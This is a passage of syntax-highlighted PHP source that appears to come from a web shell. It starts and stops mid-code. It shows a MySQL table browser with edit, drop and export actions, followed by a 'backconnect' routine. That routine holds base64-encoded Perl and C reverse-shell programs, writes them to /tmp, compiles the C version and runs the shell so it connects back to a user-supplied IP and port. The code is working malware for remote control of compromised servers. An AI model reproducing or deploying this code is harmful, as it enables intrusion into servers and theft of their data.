                                                <span class="nv">$where</span> <span class="o">.=</span> <span class="nv">$tmp</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$inside</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                                                <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">&#39; AND &#39;</span><span class="p">;</span>
                                            <span class="p">}</span>
                                        <span class="p">}</span>
                                        <span class="c1">//¶ÁÈ¡¼ÇÂ¼ÓÃ</span>
                                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$mn</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$inside</span><span class="p">){</span>
                                            <span class="nv">$b1</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="o">.</span><span class="nx">html_clean</span><span class="p">(</span><span class="nv">$inside</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
                                        <span class="p">}</span>
                                        <span class="nv">$where</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$where</span><span class="p">);</span>

                                        <span class="k">if</span> <span class="p">(</span><span class="nv">$allowedit</span><span class="p">)</span> <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&amp;lt;a href=&quot;javascript:editrecord(\&#39;edit\&#39;, \&#39;&#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Edit&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:editrecord(\&#39;del\&#39;, \&#39;&#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Del&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>

                                        <span class="nx">p</span><span class="p">(</span><span class="nv">$b1</span><span class="p">);</span>
                                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                                        <span class="nb">unset</span><span class="p">(</span><span class="nv">$b1</span><span class="p">);</span>
                                    <span class="p">}</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="nv">$allowedit</span><span class="p">)</span> <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Action&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="nv">$fieldnum</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                                    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$fieldnum</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
                                        <span class="nv">$name</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_type</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nv">$len</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_field_len</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span>
                                        <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;td nowrap&amp;gt;</span><span class="si">$name</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;</span><span class="si">$type</span><span class="s2">(</span><span class="si">$len</span><span class="s2">)&quot;</span><span class="o">.</span><span class="p">((</span><span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;UNI&#39;</span> <span class="o">||</span> <span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PRI&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;b&amp;gt; - PRIMARY&amp;lt;/b&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$rowdb</span><span class="p">[</span><span class="nv">$name</span><span class="p">][</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;auto_increment&#39;</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;b&amp;gt; - Auto&amp;lt;/b&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">);</span>
                                    <span class="p">}</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="nx">tbfoot</span><span class="p">();</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="nv">$multipage</span><span class="p">);</span>
                                    <span class="k">break</span><span class="p">;</span>
                                <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
                                    <span class="nv">$ar</span> <span class="o">=</span> <span class="nb">mysql_affected_rows</span><span class="p">();</span>
                                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;affected rows : &amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$ar</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
                                    <span class="k">break</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$query</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SHOW TABLE STATUS&quot;</span><span class="p">);</span>
                <span class="nv">$table_num</span> <span class="o">=</span> <span class="nv">$table_rows</span> <span class="o">=</span> <span class="nv">$data_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$tabledb</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$table</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$data_size</span> <span class="o">+</span> <span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Data_length&#39;</span><span class="p">];</span>
                    <span class="nv">$table_rows</span> <span class="o">=</span> <span class="nv">$table_rows</span> <span class="o">+</span> <span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Rows&#39;</span><span class="p">];</span>
                    <span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Data_length&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sizecount</span><span class="p">(</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Data_length&#39;</span><span class="p">]);</span>
                    <span class="nv">$table_num</span><span class="o">++</span><span class="p">;</span>
                    <span class="nv">$tabledb</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$table</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nx">sizecount</span><span class="p">(</span><span class="nv">$data_size</span><span class="p">);</span>
                <span class="nb">unset</span><span class="p">(</span><span class="nv">$table</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;POST&quot;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;mysqladmin&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="nv">$dbform</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td width=&quot;2%&quot; align=&quot;center&quot;&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Name&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Rows&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Data_length&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Create_time&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Update_time&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$highver</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Engine&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Collation&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Operate&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tabledb</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$table</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td align=&quot;center&quot; width=&quot;2%&quot;&amp;gt;&amp;lt;input type=&quot;checkbox&quot; name=&quot;table[]&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot; /&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Rows&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Data_length&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Create_time&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Update_time&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$highver</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Engine&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Collation&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;insert\&#39;);&quot;&amp;gt;Insert&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;structure\&#39;);&quot;&amp;gt;Structure&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;drop\&#39;);&quot;&amp;gt;Drop&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td width=&quot;2%&quot; align=&quot;center&quot;&amp;gt;&amp;lt;input name=&quot;chkall&quot; value=&quot;on&quot; type=&quot;checkbox&quot; onclick=&quot;CheckAll(this.form)&quot; /&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Name&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Rows&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Data_length&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Create_time&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Update_time&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$highver</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Engine&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Collation&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Operate&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&#39;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Total tables: &#39;</span><span class="o">.</span><span class="nv">$table_num</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$table_rows</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$data_size</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td colspan=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$highver</span> <span class="o">?</span> <span class="mi">5</span> <span class="o">:</span> <span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>

                <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;tr class=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;td colspan=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$highver</span> <span class="o">?</span> <span class="mi">9</span> <span class="o">:</span> <span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">saveasfile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> /&amp;gt; Save as file &amp;lt;input class=</span><span class="se">\&quot;</span><span class="s2">input</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">path</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">SA_ROOT</span><span class="o">.</span><span class="nv">$dbname</span><span class="o">.</span><span class="s2">&quot;.sql</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">60</span><span class="se">\&quot;</span><span class="s2"> /&amp;gt; &amp;lt;input class=</span><span class="se">\&quot;</span><span class="s2">bt</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Export selection table</span><span class="se">\&quot;</span><span class="s2"> /&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">);</span>
                <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;doing&#39;</span><span class="p">,</span><span class="s1">&#39;backupmysql&#39;</span><span class="p">);</span>
                <span class="nx">formfoot</span><span class="p">();</span>
                <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">);</span>
                <span class="nx">fr</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">tbfoot</span><span class="p">();</span>
    <span class="o">@</span><span class="nb">mysql_close</span><span class="p">();</span>
<span class="p">}</span><span class="c1">//end mysql</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;backconnect&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">!</span><span class="nv">$yourip</span> <span class="o">&amp;&amp;</span> <span class="nv">$yourip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
    <span class="o">!</span><span class="nv">$yourport</span> <span class="o">&amp;&amp;</span> <span class="nv">$yourport</span> <span class="o">=</span> <span class="s1">&#39;12345&#39;</span><span class="p">;</span>
    <span class="nv">$usedb</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;perl&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;c&#39;</span><span class="p">);</span>

    <span class="nv">$back_connect</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span><span class="o">.</span>
        <span class="s2">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span><span class="o">.</span>
        <span class="s2">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span><span class="o">.</span>
        <span class="s2">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span><span class="o">.</span>
        <span class="s2">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span><span class="o">.</span>
        <span class="s2">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span><span class="o">.</span>
        <span class="s2">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span><span class="p">;</span>
    <span class="nv">$back_connect_c</span><span class="o">=</span><span class="s2">&quot;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC&quot;</span><span class="o">.</span>
        <span class="s2">&quot;BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb&quot;</span><span class="o">.</span>
        <span class="s2">&quot;SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd&quot;</span><span class="o">.</span>
        <span class="s2">&quot;KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ&quot;</span><span class="o">.</span>
        <span class="s2">&quot;sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC&quot;</span><span class="o">.</span>
        <span class="s2">&quot;Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D&quot;</span><span class="o">.</span>
        <span class="s2">&quot;QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp&quot;</span><span class="o">.</span>
        <span class="s2">&quot;Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==&quot;</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$start</span> <span class="o">&amp;&amp;</span> <span class="nv">$yourip</span> <span class="o">&amp;&amp;</span> <span class="nv">$yourport</span> <span class="o">&amp;&amp;</span> <span class="nv">$use</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$use</span> <span class="o">==</span> <span class="s1">&#39;perl&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s1">&#39;/tmp/angel_bc&#39;</span><span class="p">,</span><span class="nv">$back_connect</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">execute</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="s1">&#39;perl&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; /tmp/angel_bc </span><span class="si">$yourip</span><span class="s2"> </span><span class="si">$yourport</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">cf</span><span class="p">(</span><span class="s1">&#39;/tmp/angel_bc.c&#39;</span><span class="p">,</span><span class="nv">$back_connect_c</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;gcc -o /tmp/angel_bc /tmp/angel_bc.c&#39;</span><span class="p">);</span>
            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;/tmp/angel_bc.c&#39;</span><span class="p">);</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">execute</span><span class="p">(</span><span class="s2">&quot;/tmp/angel_bc </span><span class="si">$yourip</span><span class="s2"> </span><span class="si">$yourport</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
